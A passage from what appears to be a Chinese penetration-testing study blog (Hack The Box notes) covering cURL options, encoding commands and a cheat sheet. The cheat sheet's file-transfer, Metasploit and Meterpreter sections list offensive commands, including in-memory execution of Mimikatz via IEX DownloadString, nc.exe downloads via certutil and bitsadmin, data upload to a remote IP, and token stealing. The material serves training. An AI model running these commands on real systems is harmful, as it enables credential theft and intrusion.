joe</code></p><p><code>icacls</code>非常强大，可以在域设置中使用，以授予某些用户或组对文件或文件夹的特定权限、显式拒绝访问、启用或禁用继承权限以及更改目录&#x2F;文件所有权。</p><p>可<a href="https://ss64.com/nt/icacls.html">在此处</a>找到命令行参数和详细权限设置的完整列表。<code>icacls</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cURL</title>
      <link href="/2023/06/11/cURL/"/>
      <url>/2023/06/11/cURL/</url>
      
        <content type="html"><![CDATA[<h1 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h1><p>####将内容输出到文件中： -O   -o</p><p>我们看到cURL不像web浏览器那样呈现HTML&#x2F;JavaScript&#x2F;CSS代码，而是以原始格式打印它。然而，作为渗透测试人员，我们主要对请求和响应上下文感兴趣，它通常比web浏览器更快、更方便。<br>我们也可以使用cURL下载页面或文件，并使用-O标志将内容输出到文件中。如果我们想指定输出文件名，我们可以使用-o标志并指定名称。否则，我们可以使用-O，cURL将使用远程文件名，如下所示：</p><pre><code>Tanin@htb[/htb]$ curl inlanefreight.com&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;...SNIP...</code></pre><pre><code>Tanin@htb[/htb]$ curl -O inlanefreight.com/index.htmlTanin@htb[/htb]$ lsindex.html</code></pre><span id="more"></span><h4 id="跳过cURL的证书检查：-k"><a href="#跳过cURL的证书检查：-k" class="headerlink" title="跳过cURL的证书检查：-k"></a>跳过cURL的证书检查：-k</h4><p>现代网络浏览器也会这样做，警告用户不要访问具有无效SSL证书的网站。<br>我们在测试本地web应用程序或使用托管用于实践目的的web应用程序时可能会面临这样的问题，因为此类web应用程序可能尚未实现有效的SSL证书。要跳过cURL的证书检查，我们可以使用-k标志：</p><pre><code>Tanin@htb[/htb]$ curl -k https://inlanefreight.com&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;...SNIP...</code></pre><h4 id="查看完整的HTTP请求和响应：-v"><a href="#查看完整的HTTP请求和响应：-v" class="headerlink" title="查看完整的HTTP请求和响应：-v"></a>查看完整的HTTP请求和响应：-v</h4><p>在我们前面的cURL示例中，我们只指定了URL，并得到了返回的响应体。然而，cURL还允许我们预览完整的HTTP请求和完整的HTTP响应，这在执行web渗透测试或编写漏洞时会变得非常方便。要查看完整的HTTP请求和响应，我们可以简单地在前面的命令中添加-v verbose标志，它应该同时打印请求和响应：</p><pre><code>Tanin@htb[/htb]$ curl inlanefreight.com -v*   Trying SERVER_IP:80...* TCP_NODELAY set* Connected to inlanefreight.com (SERVER_IP) port 80 (#0)&gt; GET / HTTP/1.1&gt; Host: inlanefreight.com&gt; User-Agent: curl/7.65.3&gt; Accept: */*&gt; Connection: close&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 401 Unauthorized&lt; Date: Tue, 21 Jul 2020 05:20:15 GMT&lt; Server: Apache/X.Y.ZZ (Ubuntu)&lt; WWW-Authenticate: Basic realm=&quot;Restricted Content&quot;&lt; Content-Length: 464&lt; Content-Type: text/html; charset=iso-8859-1&lt; &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;...SNIP...</code></pre><p>-vvv标志显示了一个更加详细的输出。</p><h4 id="只显示响应标头：-i"><a href="#只显示响应标头：-i" class="headerlink" title="只显示响应标头：-i"></a>只显示响应标头：-i</h4><p>我们看到了将-v标志与cURL一起使用如何向我们显示HTTP请求和响应的全部细节。如果我们只对查看响应标头感兴趣，那么我们可以使用-I标志发送HEAD请求，并且只显示响应标头。此外，我们可以使用-i标志来显示标题和响应主体（例如HTML代码）。两者的区别在于，-I发送一个HEAD请求（将在下一节中看到），而-I发送我们指定的任何请求并打印头。<br>以下命令显示了使用-I标志的示例输出：</p><pre><code>curl -I https://www.inlanefreight.comHost: www.inlanefreight.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko)Cookie: cookie1=298zf09hf012fh2; cookie2=u32t4o3tb3gg4Accept: text/plainReferer: https://www.inlanefreight.com/Authorization: BASIC cGFzc3dvcmQKDate: Sun, 06 Aug 2020 08:49:37 GMTConnection: keep-aliveContent-Length: 26012Content-Type: text/html; charset=ISO-8859-4Content-Encoding: gzipServer: Apache/2.2.14 (Win32)Set-Cookie: name1=value1,name2=value2; Expires=Wed, 09 Jun 2021 10:18:14 GMTWWW-Authenticate: BASIC realm=&quot;localhost&quot;Content-Security-Policy: script-src &#39;self&#39;Strict-Transport-Security: max-age=31536000Referrer-Policy: origin</code></pre><h4 id="设置请求标头：-H"><a href="#设置请求标头：-H" class="headerlink" title="设置请求标头：-H"></a>设置请求标头：-H</h4><p>除了查看标头之外，cURL还允许我们使用-H标志设置请求标头，这将在后面的部分中看到。有些标头，如用户代理或Cookie标头，有自己的标志。例如，我们可以使用-A来设置我们的用户代理，如下所示：</p><pre><code>Tanin@htb[/htb]$ curl https://www.inlanefreight.com -A &#39;Mozilla/5.0&#39;&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;...SNIP...</code></pre><p>当我们使用基本的HTTP auth时，我们看到我们的HTTP请求将Authorization头设置为basic YWRtaW46YWRtaW4&#x3D;，这是admin:admin的base64编码值。如果我们使用现代的身份验证方法（例如JWT），则授权类型为Bearer，并且将包含更长的加密令牌。<br>让我们尝试在不提供凭据的情况下手动设置授权，看看它是否允许我们访问该页面。我们可以使用-H标志设置头，并将使用上面HTTP请求中的相同值。我们可以多次添加-H标志来指定多样（ multiple ？）标头：</p><pre><code>Tanin@htb[/htb]$ curl -H &#39;Authorization: Basic YWRtaW46YWRtaW4=&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/&lt;!DOCTYPE html&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;...SNIP...</code></pre><h4 id="HTTP-Basic-Auth：-u"><a href="#HTTP-Basic-Auth：-u" class="headerlink" title="HTTP Basic Auth：-u"></a>HTTP Basic Auth：-u</h4><p>当我们访问本节末尾的练习时，它会提示我们输入用户名和密码。与使用HTTP参数来验证用户凭据（例如POST请求）的常见登录表单不同，这种类型的身份验证使用基本的HTTP身份验证，由web服务器直接处理，以保护特定的页面&#x2F;目录，而无需直接与web应用程序交互。<br>要访问该页面，我们必须输入一对有效的凭据，在这种情况下为admin:admin：</p><pre><code>Tanin@htb[/htb]$ curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;...SNIP...</code></pre><p>这一次我们确实得到了响应中的页面。还有另一种方法，我们可以提供基本的HTTP身份验证凭据，它直接通过URL作为（username:password@URL)，正如我们在第一节中所讨论的。如果我们对cURL或浏览器进行同样的尝试，我们也可以访问该页面：</p><pre><code>Tanin@htb[/htb]$ curl http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;...SNIP...</code></pre><h4 id="用户代理：-A"><a href="#用户代理：-A" class="headerlink" title="用户代理：-A"></a>用户代理：-A</h4><p>浏览器通常会在请求头中发送用户代理信息，以告诉服务器使用的是哪个浏览器及其版本。而 <code>curl</code> 命令默认情况下发送的请求没有用户代理信息，可能会导致服务器返回不同的结果或者是基于用户代理的动态网页内容。</p><p>您可以尝试使用 <code>-A</code> 或 <code>--user-agent</code> 参数在 <code>curl</code> 命令中设置一个用户代理，以模拟特定的浏览器行为，例如：</p><pre><code>curl -A &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36&quot; &lt;URL&gt;</code></pre><h4 id="Cookie：-b-–cookie"><a href="#Cookie：-b-–cookie" class="headerlink" title="Cookie：-b  –cookie"></a>Cookie：-b  –cookie</h4><p>浏览器通常会在请求头中发送与该网站相关的 Cookie 信息，以便服务器可以识别用户并提供相应的内容。而 <code>curl</code> 命令默认情况下不会自动发送 Cookie。</p><p>如果该网站依赖于 Cookie 来提供特定的内容或功能，您可以使用 <code>-b</code> 或 <code>--cookie</code> 参数在 <code>curl</code> 命令中设置一个或多个 Cookie 值，以模拟浏览器发送的 Cookie 信息。</p><pre><code>curl -b &quot;cookie1=value1; cookie2=value2&quot; &lt;URL&gt;</code></pre><h4 id="重定向：-L-–location"><a href="#重定向：-L-–location" class="headerlink" title="重定向：-L   –location"></a>重定向：-L   –location</h4><p>浏览器通常会自动处理服务器返回的重定向（例如，HTTP 3xx 状态码），并在必要时自动跳转到新的 URL。而 <code>curl</code> 命令默认情况下不会自动处理重定向。</p><p>如果服务器返回了重定向响应，您可以使用 <code>-L</code> 或 <code>--location</code> 参数来让 <code>curl</code> 命令自动跟随重定向，并获取最终的内容。</p><pre><code>curl -L &lt;URL&gt;</code></pre><p>####请求方式：-X</p><pre><code>Tanin@htb[/htb]$ curl -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/...SNIP...        &lt;em&gt;Type a city name and hit &lt;strong&gt;Enter&lt;/strong&gt;&lt;/em&gt;...SNIP...</code></pre><pre><code>Tip: Many login forms would redirect us to a different page once authenticated (e.g. /dashboard.php). If we want to follow the redirection with cURL, we can use the -L flag.</code></pre><h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>​我们将使用-X POST标志来发送POST请求。然后，为了添加POST数据，我们可以使用-d标志并在其后面添加上述数据，如下所示：</p><pre><code>Tanin@htb[/htb]$ curl -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/...SNIP...        &lt;em&gt;Type a city name and hit &lt;strong&gt;Enter&lt;/strong&gt;&lt;/em&gt;...SNIP...</code></pre><p>有了经过身份验证的cookie，我们现在应该能够与web应用程序交互，而无需每次都提供凭据。为了测试这一点，我们可以在cURL中设置带有-b标志的上述cookie，如下所示：</p><pre><code>Tanin@htb[/htb]$ curl -b &#39;PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/...SNIP...        &lt;em&gt;Type a city name and hit &lt;strong&gt;Enter&lt;/strong&gt;&lt;/em&gt;...SNIP...</code></pre><p>正如我们所看到的，我们确实通过了身份验证并进入了搜索功能。也可以将cookie指定为标头，如下所示：</p><pre><code>curl -H &#39;Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></pre><h4 id="格式化json-：-jq"><a href="#格式化json-：-jq" class="headerlink" title="格式化json ：| jq"></a>格式化json ：| jq</h4><p>我们看到结果是以JSON字符串的形式发送的。为了将其正确格式化为JSON格式，我们可以将输出通过管道传输到jq实用程序，后者将正确格式化它。我们还将使用-s静音任何不需要的cURL输出，如下所示：</p><pre><code>Tanin@htb[/htb]$ curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london[&#123;&quot;city_name&quot;:&quot;London&quot;,&quot;country_name&quot;:&quot;(UK)&quot;&#125;]</code></pre><pre><code>Tanin@htb[/htb]$ curl -s http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london | jq[  &#123;    &quot;city_name&quot;: &quot;London&quot;,    &quot;country_name&quot;: &quot;(UK)&quot;  &#125;]</code></pre><h4 id="静默-s"><a href="#静默-s" class="headerlink" title="静默 -s"></a>静默 -s</h4><p><code>curl -s</code> 是一个命令行工具的选项组合。它使用的是 <code>curl</code> 这个工具，用于在命令行中进行网络数据传输。</p><p>具体而言，<code>-s</code> 选项表示 “silent”（静默）的意思。当你在执行 <code>curl</code> 命令时，使用 <code>-s</code> 选项会禁止输出任何进度信息或错误消息。它使得 <code>curl</code> 在执行请求时不会产生额外的输出，只会返回请求的结果。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YouTube Channels</title>
      <link href="/2023/06/11/YouTube%20Channels/"/>
      <url>/2023/06/11/YouTube%20Channels/</url>
      
        <content type="html"><![CDATA[<h4 id="YouTube-Channels"><a href="#YouTube-Channels" class="headerlink" title="YouTube Channels"></a>YouTube Channels</h4><p>There are many YouTube channels out there that showcase penetration testing&#x2F;hacking techniques. A few worth bookmarking are:</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">IppSec</a></td><td>Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.</td></tr><tr><td><a href="https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ">VbScrub</a></td><td>Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.</td></tr><tr><td><a href="https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg">STÖK</a></td><td>Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.</td></tr><tr><td><a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w">LiveOverflow</a></td><td>Provides videos on a wide variety of technical infosec topics.</td></tr></tbody></table><span id="more"></span>]]></content>
      
      
      
        <tags>
            
            <tag> other </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>encode</title>
      <link href="/2023/06/11/encode/"/>
      <url>/2023/06/11/encode/</url>
      
        <content type="html"><![CDATA[<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h4 id="Base64-Encode"><a href="#Base64-Encode" class="headerlink" title="Base64 Encode"></a>Base64 Encode</h4><p>To encode any text into <code>base64</code> in Linux, we can echo it and pipe it with ‘<code>|</code>‘ to <code>base64</code>:</p><p>  Base64 Encode</p><pre><code>Tanin@htb[/htb]$ echo https://www.hackthebox.eu/ | base64aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K</code></pre><span id="more"></span><p>####Base64 Decode</p><p>If we want to decode any <code>base64</code> encoded string, we can use <code>base64 -d</code>, as follows:</p><p>  Base64 Decode</p><pre><code>Tanin@htb[/htb]$ echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -dhttps://www.hackthebox.eu/</code></pre><h4 id="Hex-Encode"><a href="#Hex-Encode" class="headerlink" title="Hex Encode"></a>Hex Encode</h4><p>To encode any string into <code>hex</code> in Linux, we can use the <code>xxd -p</code> command:</p><p>  Hex Encode</p><pre><code>Tanin@htb[/htb]$ echo https://www.hackthebox.eu/ | xxd -p68747470733a2f2f7777772e6861636b746865626f782e65752f0a</code></pre><h4 id="Hex-Decode"><a href="#Hex-Decode" class="headerlink" title="Hex Decode"></a>Hex Decode</h4><p>To decode a <code>hex</code> encoded string, we can use the <code>xxd -p -r</code> command:</p><p>  Hex Decode</p><pre><code>Tanin@htb[/htb]$ echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -rhttps://www.hackthebox.eu/</code></pre><p>在命令行中，<code>xxd -p -r</code> 是一个常见的命令，用于进行十六进制转换和恢复。</p><ul><li><code>p</code> 代表 “plain”，表示以纯文本（plain text）形式进行转换。在这种情况下，<code>xxd</code> 命令将会以十六进制表示的字节流转换为对应的纯文本数据。</li><li><code>r</code> 代表 “reverse”，表示进行逆向操作，即从十六进制数据恢复为原始的二进制数据。</li></ul><p>因此，<code>xxd -p -r</code> 的完整含义是将以十六进制表示的字节流转换为对应的纯文本数据，或将十六进制数据恢复为原始的二进制数据。</p><p><code>xxd</code> 是一个实用工具，用于在命令行中进行十六进制转换和操作。它的全称是 “hexdump”，表示以十六进制形式进行转储（hexadecimal dump）。它可以用于查看、创建和修改二进制文件的十六进制表示形式。</p><h4 id="Rot13-Encode"><a href="#Rot13-Encode" class="headerlink" title="Rot13 Encode"></a>Rot13 Encode</h4><p>There isn’t a specific command in Linux to do <code>rot13</code> encoding. However, it is fairly easy to create our own command to do the character shifting:</p><p>  Rot13 Encode</p><pre><code>Tanin@htb[/htb]$ echo https://www.hackthebox.eu/ | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;uggcf://jjj.unpxgurobk.rh/</code></pre><h4 id="Rot13-Decode"><a href="#Rot13-Decode" class="headerlink" title="Rot13 Decode"></a>Rot13 Decode</h4><p>We can use the same previous command to decode rot13 as well:</p><p>  Rot13 Decode</p><pre><code>Tanin@htb[/htb]$ echo uggcf://jjj.unpxgurobk.rh/ | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;https://www.hackthebox.eu/</code></pre><ul><li><code>echo https://www.hackthebox.eu/</code>：输出字符串 “<a href="https://www.hackthebox.eu/">https://www.hackthebox.eu/</a>“</li><li><code>tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;</code>：使用 <code>tr</code> 命令进行字符替换。该命令将字母进行凯撒密码的置换，将字母 A-Z 和 a-z 分别替换为 N-ZA-M 和 n-za-m。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>备忘录</title>
      <link href="/2023/06/11/chat_sheet/"/>
      <url>/2023/06/11/chat_sheet/</url>
      
        <content type="html"><![CDATA[<h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>curl -h</code></td><td>cURL help menu</td></tr><tr><td><code>curl inlanefreight.com</code></td><td>Basic GET request</td></tr><tr><td><code>curl -s -O inlanefreight.com/index.html</code></td><td>Download file</td></tr><tr><td><code>curl -k https://inlanefreight.com</code></td><td>Skip HTTPS (SSL) certificate validation</td></tr><tr><td><code>curl inlanefreight.com -v</code></td><td>Print full HTTP request&#x2F;response details</td></tr><tr><td><code>curl -I https://www.inlanefreight.com</code></td><td>Send HEAD request (only prints response headers)</td></tr><tr><td><code>curl -i https://www.inlanefreight.com</code></td><td>Print response headers and response body</td></tr><tr><td><code>curl https://www.inlanefreight.com -A &#39;Mozilla/5.0&#39;</code></td><td>Set User-Agent header</td></tr><tr><td><code>curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Set HTTP basic authorization credentials</td></tr><tr><td><code>curl http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Pass HTTP basic authorization credentials in the URL</td></tr><tr><td><code>curl -H &#39;Authorization: Basic YWRtaW46YWRtaW4=&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Set request header</td></tr><tr><td><code>curl &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php?search=le&#39;</code></td><td>Pass GET parameters</td></tr><tr><td><code>curl -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Send POST request with POST data</td></tr><tr><td><code>curl -b &#39;PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Set request cookies</td></tr><tr><td><code>curl -X POST -d &#39;&#123;&quot;search&quot;:&quot;london&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php</code></td><td>Send POST request with JSON data</td></tr></tbody></table><span id="more"></span><h2 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london</code></td><td>Read entry</td></tr><tr><td>&#96;curl -s http:&#x2F;&#x2F;<SERVER_IP>:<PORT>&#x2F;api.php&#x2F;city&#x2F;</td><td>jq&#96;</td></tr><tr><td><code>curl -X POST http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ -d &#39;&#123;&quot;city_name&quot;:&quot;HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td><td>Create (add) entry</td></tr><tr><td><code>curl -X PUT http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london -d &#39;&#123;&quot;city_name&quot;:&quot;New_HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td><td>Update (modify) entry</td></tr><tr><td><code>curl -X DELETE http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/New_HTB_City</code></td><td>Delete entry</td></tr></tbody></table><h2 id="Browser-DevTools"><a href="#Browser-DevTools" class="headerlink" title="Browser DevTools"></a>Browser DevTools</h2><table><thead><tr><th><strong>Shortcut</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>[<code>CTRL+SHIFT+I</code>] or [<code>F12</code>]</td><td>Show devtools</td></tr><tr><td>[<code>CTRL+SHIFT+E</code>]</td><td>Show Network tab</td></tr><tr><td>[<code>CTRL+SHIFT+K</code>]</td><td></td></tr></tbody></table><table><thead><tr><th><code>curl http:/SERVER_IP:PORT/</code></th><th>cURL 获取请求</th></tr></thead><tbody><tr><td><code>curl -s http:/SERVER_IP:PORT/ -X POST</code></td><td>cURL 发布请求</td></tr><tr><td><code>curl -s http:/SERVER_IP:PORT/ -X POST -d &quot;param1=sample&quot;</code></td><td>包含数据的网址 POST 请求</td></tr><tr><td>&#96;echo hackthebox</td><td>base64&#96;</td></tr><tr><td>&#96;echo ENCODED_B64</td><td>base64 -d&#96;</td></tr><tr><td>&#96;echo hackthebox</td><td>xxd -p&#96;</td></tr><tr><td>&#96;echo ENCODED_HEX</td><td>xxd -p -r&#96;</td></tr><tr><td>&#96;echo hackthebox</td><td>tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’&#96;</td></tr><tr><td>&#96;echo ENCODED_ROT13</td><td>tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’&#96;</td></tr></tbody></table><h1 id="Deobfuscation-Websites"><a href="#Deobfuscation-Websites" class="headerlink" title="Deobfuscation Websites"></a>Deobfuscation Websites</h1><table><thead><tr><th><strong>Website</strong></th></tr></thead><tbody><tr><td><a href="https://jsconsole.com/">JS Console</a></td></tr><tr><td><a href="https://prettier.io/playground/">Prettier</a></td></tr><tr><td><a href="https://beautifier.io/">Beautifier</a></td></tr><tr><td><a href="http://www.jsnice.org/">JSNice</a></td></tr></tbody></table><p>##文件传输</p><table><thead><tr><th><code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code></th><th>使用 PowerShell 下载文件</th></tr></thead><tbody><tr><td><code>IEX (New-Object Net.WebClient).DownloadString(&#39;https://&lt;snip&gt;/Invoke-Mimikatz.ps1&#39;)</code></td><td>使用 PowerShell 在内存中执行文件</td></tr><tr><td><code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code></td><td>使用 PowerShell 上传文件</td></tr><tr><td><code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe</code></td><td>使用 Bitsadmin 下载文件</td></tr><tr><td><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></td><td>使用 Certutil 下载文件</td></tr><tr><td><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></td><td>使用 Wget 下载文件</td></tr><tr><td><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></td><td>使用 cURL 下载文件</td></tr><tr><td><code>php -r &#39;$file = file_get_contents(&quot;https://&lt;snip&gt;/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;</code></td><td>使用 PHP 下载文件</td></tr><tr><td><code>scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code></td><td>使用 SCP 上传文件</td></tr><tr><td><code>scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe</code></td><td>使用 SCP 下载文件</td></tr><tr><td><code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile &quot;nc.exe&quot;</code></td><td>使用 Chrome 用户代理的 Invoke-WebRequest</td></tr></tbody></table><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><table><thead><tr><th><code>show exploits</code></th><th>显示框架内的所有漏洞。</th></tr></thead><tbody><tr><td><code>show payloads</code></td><td>显示框架中的所有有效负载。</td></tr><tr><td><code>show auxiliary</code></td><td>显示框架中的所有辅助模块。</td></tr><tr><td><code>search &lt;name&gt;</code></td><td>在框架中搜索漏洞或模块。</td></tr><tr><td><code>info</code></td><td>加载有关特定漏洞利用或模块的信息。</td></tr><tr><td><code>use &lt;name&gt;</code></td><td>加载漏洞利用或模块（例如：使用 Windows&#x2F;smb&#x2F;psexec）。</td></tr><tr><td><code>use &lt;number&gt;</code></td><td>使用搜索命令后显示的索引号加载漏洞利用。</td></tr><tr><td><code>LHOST</code></td><td>目标可访问的本地主机 IP 地址，如果不在本地网络上，通常是公共 IP 地址。通常用于反向壳。</td></tr><tr><td><code>RHOST</code></td><td>远程主机或目标。set函数 设置特定值（例如，LHOST 或 RHOST）。</td></tr><tr><td><code>setg &lt;function&gt;</code></td><td>全局设置特定值（例如，LHOST 或 RHOST）。</td></tr><tr><td><code>show options</code></td><td>显示可用于模块或漏洞利用的选项。</td></tr><tr><td><code>show targets</code></td><td>显示漏洞利用支持的平台。</td></tr><tr><td><code>set target &lt;number&gt;</code></td><td>如果您知道操作系统和服务包，请指定特定的目标索引。</td></tr><tr><td><code>set payload &lt;payload&gt;</code></td><td>指定要使用的有效负载。</td></tr><tr><td><code>set payload &lt;number&gt;</code></td><td>指定要在显示有效负载命令后使用的有效负载索引号。</td></tr><tr><td><code>show advanced</code></td><td>显示高级选项。</td></tr><tr><td><code>set autorunscript migrate -f</code></td><td>漏洞利用完成后自动迁移到单独的进程。</td></tr><tr><td><code>check</code></td><td>确定目标是否容易受到攻击。</td></tr><tr><td><code>exploit</code></td><td>执行模块或利用并攻击目标。</td></tr><tr><td><code>exploit -j</code></td><td>在作业上下文中运行漏洞利用。（这将在后台运行漏洞利用。</td></tr><tr><td><code>exploit -z</code></td><td>成功利用漏洞后不要与会话交互。</td></tr><tr><td><code>exploit -e &lt;encoder&gt;</code></td><td>指定要使用的有效负载编码器（例如：exploit –e shikata_ga_nai）。</td></tr><tr><td><code>exploit -h</code></td><td>显示漏洞利用命令的帮助。</td></tr><tr><td><code>sessions -l</code></td><td>列出可用会话（在处理多个 shell 时使用）。</td></tr><tr><td><code>sessions -l -v</code></td><td>列出所有可用会话并显示详细字段，例如利用系统时使用了哪个漏洞。</td></tr><tr><td><code>sessions -s &lt;script&gt;</code></td><td>在所有 Meterpreter 实时会话上运行特定的 Meterpreter 脚本。</td></tr><tr><td><code>sessions -K</code></td><td>终止所有实时会话。</td></tr><tr><td><code>sessions -c &lt;cmd&gt;</code></td><td>在所有实时 Meterpreter 会话上执行命令。</td></tr><tr><td><code>sessions -u &lt;sessionID&gt;</code></td><td>将普通的 Win32 外壳升级到 Meterpreter 控制台。</td></tr><tr><td><code>db_create &lt;name&gt;</code></td><td>创建用于数据库驱动攻击的数据库（例如：db_create autopwn）。</td></tr><tr><td><code>db_connect &lt;name&gt;</code></td><td>创建并连接到用于驱动攻击的数据库（例如：db_connect autopwn）。</td></tr><tr><td><code>db_nmap</code></td><td>使用 Nmap 并将结果放入数据库中。（支持正常的 Nmap 语法，例如 –sT –v –P0。</td></tr><tr><td><code>db_destroy</code></td><td>删除当前数据库。</td></tr><tr><td><code>db_destroy &lt;user:password@host:port/database&gt;</code></td><td>使用高级选项删除数据库。</td></tr><tr><td></td><td></td></tr></tbody></table><hr><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>help</code></td><td>打开 Meterpreter 使用帮助。</td></tr><tr><td><code>run &lt;scriptname&gt;</code></td><td>运行基于 Meterpreter 的脚本;有关完整列表，请查看 scripts&#x2F;meterpreter 目录。</td></tr><tr><td><code>sysinfo</code></td><td>显示有关受损目标的系统信息。</td></tr><tr><td><code>ls</code></td><td>列出目标上的文件和文件夹。</td></tr><tr><td><code>use priv</code></td><td>加载扩展的 Meterpreter 库的权限扩展。</td></tr><tr><td><code>ps</code></td><td>显示所有正在运行的进程以及与每个进程关联的帐户。</td></tr><tr><td><code>migrate &lt;proc. id&gt;</code></td><td>迁移到特定进程 ID（PID 是从 ps 命令获取的目标进程 ID）。</td></tr><tr><td><code>use incognito</code></td><td>加载隐身功能。（用于目标计算机上的令牌窃取和模拟。</td></tr><tr><td><code>list_tokens -u</code></td><td>按用户列出目标上的可用令牌。</td></tr><tr><td><code>list_tokens -g</code></td><td>按组列出目标上的可用令牌。</td></tr><tr><td><code>impersonate_token &lt;DOMAIN_NAMEUSERNAME&gt;</code></td><td>模拟目标上可用的令牌。</td></tr><tr><td><code>steal_token &lt;proc. 